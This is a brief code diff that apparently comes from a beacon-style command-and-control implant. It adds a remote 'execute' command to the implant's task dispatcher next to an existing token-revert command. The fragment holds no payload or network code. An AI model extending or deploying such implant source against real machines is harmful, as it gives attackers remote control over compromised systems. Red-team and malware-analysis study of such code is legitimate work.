@@ -45,6 +45,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_TOKEN_REV2SELF:
 			BeaconRevertToken();
 			break;
+		case COMMAND_EXECUTE:
+			Execute(buffer, size);
+			break;
 	}
 }
 
